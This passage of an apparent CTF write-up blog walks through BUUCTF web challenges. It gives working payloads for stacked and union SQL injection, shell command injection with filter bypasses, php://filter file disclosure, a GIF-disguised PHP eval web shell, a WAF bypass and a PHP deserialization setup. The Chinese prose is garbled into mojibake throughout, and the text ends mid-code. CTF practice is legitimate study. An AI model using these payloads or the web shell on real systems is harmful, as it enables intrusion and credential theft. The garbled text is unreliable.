class="headerlink" title="[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨"></a>[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨</h2><p>ç»å…¸è€é¢˜</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201072253903.png" alt="image-20220107225301830"></p><p>åˆ©ç”¨å †å æ³¨å…¥è·å–æ‰€æœ‰è¡¨</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201072253353.png" alt="image-20220107225349306"></p><p>å‘ç° 1919810931114514 è¿™ä¸ªè¡¨é‡Œæœ‰ flagå­—æ®µ</p><p>ä¹‹åå‘ç°è¿‡æ»¤äº†select ç­‰å­—æ®µ é‚£å…¶å®åˆæˆä¸€ä¸‹å°±è¡Œ</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs csharp">?inject=<span class="hljs-number">1&#x27;</span>;<span class="hljs-function">PREPARE hacker <span class="hljs-keyword">from</span> <span class="hljs-title">concat</span>(<span class="hljs-params"><span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;elect&#x27;</span>, <span class="hljs-string">&#x27; * from `1919810931114514` &#x27;</span></span>)</span>;EXECUTE hacker;<span class="hljs-meta">#</span><br><span class="hljs-function">PREPARE hacker <span class="hljs-keyword">from</span> <span class="hljs-title">concat</span>(<span class="hljs-params"><span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;esc&#x27;</span>,<span class="hljs-string">&#x27;Flag&#x27;</span></span>)</span>;EXECUTE hacker;<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201080015265.png" alt="image-20220108001548214"></p><p>ç»è¿‡æµ‹è¯•å‘ç°å¯ä»¥ å †å æ³¨å…¥ <code>1;show databases;#</code></p><p>æœ‰è¡¨</p><blockquote><p>ctftraining</p><p>ctf</p><p>information_schema</p><p>mysql</p><p>performance_schema</p><p>test</p></blockquote><p>å‰©ä¸‹çš„å°±ä¸ä¼šäº†</p><p>éé¢„æœŸ  *,1</p><p>é¢„æœŸè§£ </p><p>1;set sql_mode=PIPES_AS_CONCAT;select 1</p><div class="code-wrapper"><pre><code class="hljs">åœ¨oracle ç¼ºçœæ”¯æŒ é€šè¿‡ â€˜ || â€™ æ¥å®ç°å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œä½†åœ¨mysql ç¼ºçœä¸æ”¯æŒã€‚éœ€è¦è°ƒæ•´mysql çš„sql_mode æ¨¡å¼ï¼špipes_as_concat æ¥å®ç°oracle çš„ä¸€äº›åŠŸèƒ½ã€‚è¿™é‡Œå¯ä»¥ç†è§£ä¸º sql åœ¨é‡åˆ° 1||(0/1) æ—¶ åªè¿è¡Œå‰ä¸€ä¸ª æ‰€ä»¥æ— æ³•æŸ¥è¯¢ç¬¬äºŒä¸ªæ“ä½œæ•°</code></pre></div><p>mysqlé€»è¾‘è¿ç®— <a href="https://www.runoob.com/mysql/mysql-operator.html">https://www.runoob.com/mysql/mysql-operator.html</a></p><h2 id="ACTF2020-æ–°ç”Ÿèµ›-Exec"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Exec" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Exec"></a>[ACTF2020 æ–°ç”Ÿèµ›]Exec</h2><p>å¤ªåŸºç¡€äº† ä¸æƒ³å†™ 127.0.0.1 | cat /flag</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201080022247.png" alt="image-20220108002235193"></p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Secret"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Secret" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret</h2><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201081540389.png" alt="image-20220108154009276"></p><p>ä¸€å¼€å§‹ä»¥ä¸ºæ˜¯httpè·³è½¬ ç„¶åå‘ç°è¿™ä¸ªåœ°æ–¹æœ‰ä¸ªa æ ‡ç­¾è·³è½¬åˆ° ./Archive_room.php</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201081542857.png" alt="image-20220108154203809"></p><p>ä¹‹ååˆå‘ç°äº†secret.php</p><p>å¾—åˆ°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>    error_reporting(<span class="hljs-number">0</span>);<br>    <span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(strstr(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;../&quot;</span>)||stristr(<span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;tp&quot;</span>)||stristr(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;input&quot;</span>)||stristr(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;data&quot;</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Oh no!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>();<br>    &#125;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>); <br><span class="hljs-comment">//flagæ”¾åœ¨äº†flag.phpé‡Œ</span><br><span class="hljs-meta">?&gt;</span><br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>å°è¯•ç›´æ¥åŒ…å«flag.phpä½†æ˜¯æ–‡ä»¶å†…å®¹ä¸å¯è§ é‚£ä¹ˆå°±å¯ä»¥ç”¨phpä¸ºåè®®è¯»å–</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs payload">?file=php://filter/read=convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL</h2><p>ç›´æ¥ä¸‡èƒ½å¯†ç  1â€™ or 1=1# å¾—åˆ°adminå¯†ç a6459693046ee8280c4a2b5a9625bc45 æ­£å¥½32ä½æˆ‘å°è¯• 8-4-4-4-12ç›´æ¥äº¤flagä½†å®é™…ä¸æ˜¯</p><p>ä¹‹åå‘ç°æˆ‘ä»¬å¯ä»¥ç»§ç»­æ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">check.php?username=admin1&#x27; union select 1,version(),database()%23&amp;password=a6459693046ee8280c4a2b5a9625bc45<br></code></pre></td></tr></table></figure><p>ç‰ˆæœ¬ï¼š10.3.18-MariaDB</p><p>æ•°æ®åº“ï¼šgeek</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">check.php?username=admin1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;geek&#x27;%23&amp;password=a6459693046ee8280c4a2b5a9625bc45<br></code></pre></td></tr></table></figure><p>geekuser,l0ve1ysq1</p><p>æ•°æ®åº“geek ä¿©è¡¨ geekuser,l0ve1ysq1</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">check</span>.php?username=admin<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,group_concat(column_name),<span class="hljs-number">3</span> from information_schema.columns where table_name=&#x27;l<span class="hljs-number">0</span>ve<span class="hljs-number">1</span>ysq<span class="hljs-number">1</span>&#x27;%<span class="hljs-number">23</span>&amp;password=a<span class="hljs-number">6459693046</span>ee<span class="hljs-number">8280</span>c<span class="hljs-number">4</span>a<span class="hljs-number">2</span>b<span class="hljs-number">5</span>a<span class="hljs-number">9625</span>bc<span class="hljs-number">45</span><br></code></pre></td></tr></table></figure><p>ä¸‰ä¸ªå­—æ®µid,username,password</p><p>æœ€ç»ˆpayload</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">check</span>.php?username=admin<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,group_concat(id,username,password),<span class="hljs-number">3</span> from l<span class="hljs-number">0</span>ve<span class="hljs-number">1</span>ysq<span class="hljs-number">1</span>%<span class="hljs-number">23</span>&amp;password=a<span class="hljs-number">6459693046</span>ee<span class="hljs-number">8280</span>c<span class="hljs-number">4</span>a<span class="hljs-number">2</span>b<span class="hljs-number">5</span>a<span class="hljs-number">9625</span>bc<span class="hljs-number">45</span><br></code></pre></td></tr></table></figure><h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>ç›´æ¥æ„é€ ï¼Œä¸‰è€…éƒ½è¡Œ</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata">ip=127.0.0.1|echo<span class="hljs-variable">$IFS</span><span class="hljs-variable">$1Y2F0IGZsYWcucGhw</span>|base64<span class="hljs-variable">$IFS</span><span class="hljs-variable">$1</span>-<span class="hljs-keyword">d</span>|<span class="hljs-keyword">sh</span><br>?ip=127.0.0.1;<span class="hljs-keyword">cat</span><span class="hljs-variable">$IFS</span><span class="hljs-variable">$9</span>`<span class="hljs-keyword">ls</span>`<br>?ip=127.0.0.1;a=<span class="hljs-keyword">g</span>;<span class="hljs-keyword">cat</span><span class="hljs-variable">$IFS</span><span class="hljs-variable">$1fla</span><span class="hljs-variable">$a</span>.php<br></code></pre></td></tr></table></figure><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Knife"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Knife" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife</h2><p>èšå‰‘ç›´æ¥è¿</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201082158823.png" alt="image-20220108215810763"></p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Http"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Http" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Http"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Http</h2><p>æ— æ³•ç›´æ¥è®¿é—®ç½‘é¡µ</p><p>è¿™é‡Œé€‰æ‹©äº† curl</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201082205781.png" alt="image-20220108220545599"></p><p>å‘ç°äº† Secret.php</p><p>æ„å»ºæ•°æ®åŒ…</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/Secret.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>node4.buuoj.cn:26189<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Syclover<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>UM_distinctid=17ce3948a50a00-06fd4863146224-561a135a-144000-17ce3948a51bb6<br>Referer:https://Sycsecret.buuoj.cn<br>X-Forwarded-For:127.0.0.1<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br></code></pre></td></tr></table></figure><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Upload"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Upload" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload</h2><p>æ„å»ºé©¬å­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a<br>&lt;script language=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]);&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201082219255.png" alt="image-20220108221915179"></p><h2 id="ACTF2020-æ–°ç”Ÿèµ›-Upload"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Upload" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Upload"></a>[ACTF2020 æ–°ç”Ÿèµ›]Upload</h2><p>å’Œä¸Šé¢ä¸€é¢˜ä¸€æ ·ï¼Œä¸èµ˜è¿°</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201082222743.png" alt="image-20220108222232683"></p><h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>æ•´æŒºå¥½</p><p>è€ƒç‚¹ï¼šæ— å‚æ•°RCEï¼Œphpç‰¹æ€§</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201091610973.png" alt="image-20220109161023880"></p><p>é¦–å…ˆæ˜¯è¿™ä¸ªé¡µé¢ä»¥ä¸ºå¯ä»¥ç›´æ¥æ‰§è¡Œå‘½ä»¤ä½†æ˜¯å®é™…ä¸Šå¹¶æ²¡æœ‰ï¼Œç„¶åçœ‹æºä»£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML"><br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;<br>  &lt;title&gt;ç®€å•çš„è®¡ç®—å™¨&lt;/title&gt;<br>  <br>  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;<br>  &lt;link rel=&quot;stylesheet&quot; href=&quot;./libs/bootstrap.min.css&quot;&gt;<br>  &lt;script src=&quot;./libs/jquery-3.3.1.min.js&quot;&gt;&lt;/script&gt;<br>  &lt;script src=&quot;./libs/bootstrap.min.js&quot;&gt;&lt;/script&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br><br>&lt;div class=&quot;container text-center&quot; style=&quot;margin-top:30px;&quot;&gt;<br>  &lt;h2&gt;è¡¨è¾¾å¼&lt;/h2&gt;<br>  &lt;form id=&quot;calc&quot;&gt;<br>    &lt;div class=&quot;form-group&quot;&gt;<br>      &lt;input type=&quot;text&quot; class=&quot;form-control&quot; id=&quot;content&quot; placeholder=&quot;è¾“å…¥è®¡ç®—å¼&quot; data-com.agilebits.onepassword.user-edited=&quot;yes&quot;&gt;<br>    &lt;/div&gt;<br>    &lt;div id=&quot;result&quot;&gt;&lt;div class=&quot;alert alert-success&quot;&gt;<br>            &lt;/div&gt;&lt;/div&gt;<br>    &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;è®¡ç®—&lt;/button&gt;<br>  &lt;/form&gt;<br>&lt;/div&gt;<br>&lt;!--I&#x27;ve set up WAF to ensure security.--&gt;<br>&lt;script&gt;<br>    $(&#x27;#calc&#x27;).submit(function()&#123;<br>        $.ajax(&#123;<br>            url:&quot;calc.php?num=&quot;+encodeURIComponent($(&quot;#content&quot;).val()),<br>            type:&#x27;GET&#x27;,<br>            success:function(data)&#123;<br>                $(&quot;#result&quot;).html(`&lt;div class=&quot;alert alert-success&quot;&gt;<br>            &lt;strong&gt;ç­”æ¡ˆ:&lt;/strong&gt;$&#123;data&#125;<br>            &lt;/div&gt;`);<br>            &#125;,<br>            error:function()&#123;<br>                alert(&quot;è¿™å•¥?ç®—ä¸æ¥!&quot;);<br>            &#125;<br>        &#125;)<br>        return false;<br>    &#125;)<br>&lt;/script&gt;<br><br>&lt;/body&gt;&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>å‘ç°äº†calc.phpè¿™ä¸ªé¡µé¢ è¿™ä¸ªåœ°æ–¹ä¹Ÿæ˜¯ç”¨ajaxå’Œcalcé¡µé¢è¿›è¡Œæ•°æ®ä¼ è¾“ï¼Œå‰å¾€calc.php è·å¾—ä»£ç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    show_source(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>        <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>,<span class="hljs-string">&#x27;\$&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;\^&#x27;</span>];<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>                <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$str</span>)) &#123;<br>                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;what are you want to do?&quot;</span>);<br>                &#125;<br>        &#125;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å¦‚æœæˆ‘ä»¬ä¼ å…¥<code>num</code>çš„è¯ï¼Œæ ¹æœ¬å°±ä¸ä¼šæ‰§è¡Œæˆ‘ä»¬å¸Œæœ›æ‰§è¡Œçš„evalå‡½æ•°ï¼Œè¿™ä¸ªæ—¶å€™å¯ä»¥åˆ©ç”¨PHPè§£æçš„ç‰¹æ€§</p><p>æ„é€ <code>? num=phpinfo()</code>è¿™æ—¶ï¼Œå°±ä¼šç»•è¿‡WAFå’Œissetçš„åˆ¤æ–­ã€‚è¿™æ ·å®é™…ä¸Š æœåŠ¡å™¨è‡ªå·±æ¥æ”¶çš„æ˜¯ <code> num</code> è€Œè‡ªå·±å¤„ç†çš„æ•°æ®æ˜¯ <code>num</code> è¿™é‡Œæœ‰ä¸€ä¸ªç©ºæ ¼çš„åŒºåˆ«</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201091634769.png" alt="image-20220109163404711"></p><p>å¯ä»¥çœ‹åˆ°phpinfoå†…å¾ˆå¤šå‘½ä»¤æ‰§è¡Œçš„å‡½æ•°è¢«ç¦ç”¨ï¼Œä½†æ˜¯æ²¡æœ‰ç¦ç”¨è¯¸å¦‚ var_dump,scan_dir,next,highlight_file è¿™ç±»å¯ä»¥å¯¹æ–‡ä»¶æ‰«æè¯»å–çš„å‡½æ•°</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201091635556.png" alt="image-20220109163527463"></p><p>æ„å»º <code>? num=var_dump(scandir(chr(47)))</code> å¯¹æ ¹ç›®å½•æ‰«æ chr(47) =&gt; â€˜/â€˜</p><p>æœ€ç»ˆpayload <code>? num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)));</code></p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-PHP"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-PHP" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP</h2><p>é¦–é¡µç›´æ¥æç¤ºå¤‡ä»½æºç ï¼Œ<a href="http://www.zip/">www.zip</a> æ‰¾åˆ°æºç </p><p>åœ¨index.phpä¸­å‘ç°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;class.php&#x27;</span>;<br>  <span class="hljs-variable">$select</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;select&#x27;</span>];<br>  <span class="hljs-variable">$res</span>=unserialize(@<span class="hljs-variable">$select</span>);<br>  <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>çœ‹æ¥æ˜¯ååºåˆ—åŒ– è·Ÿè¿›class.phpï¼Œå¾—åˆ°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br><br>error_reporting(<span class="hljs-number">0</span>);<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;nonono&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;yesyes&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-string">&#x27;guest&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;password != <span class="hljs-number">100</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You name is: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;username;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You password is: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;password;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;username === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;<br>            <span class="hljs-keyword">die</span>();          <br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>é‚£æˆ‘ä»¬åªè¦è®© usernmae=admin,password=100å³å¯ï¼Œæ„é€ </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>   <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;admin&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;100&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span 